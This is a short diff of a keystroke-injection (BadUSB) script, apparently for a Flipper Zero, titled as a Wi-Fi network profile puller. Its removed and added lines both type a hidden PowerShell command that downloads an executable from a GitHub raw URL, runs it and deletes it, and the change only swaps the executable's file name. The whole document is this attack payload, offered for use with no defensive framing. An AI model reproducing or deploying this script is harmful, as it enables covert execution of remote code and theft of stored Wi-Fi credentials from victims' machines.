@@ -2,7 +2,7 @@ REM wifi network profile puller
 
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -Command "& {cd $home ; Invoke-Webrequest -Uri https://raw.githubusercontent.com/synder934/Flipper0/main/WIFIPasswords/exeinhere\compact.exe -OutFile .\Downloads\main.exe ; .\Downloads\main.exe ; Remove-Item .\Downloads\main.exe}"
+STRING powershell -WindowStyle Hidden -Command "& {cd $home ; Invoke-Webrequest -Uri https://raw.githubusercontent.com/synder934/Flipper0/main/WIFIPasswords/exeinhere\comp.exe -OutFile .\Downloads\main.exe ; .\Downloads\main.exe ; Remove-Item .\Downloads\main.exe}"
 ENTER
 DELAY 500
 GUI r
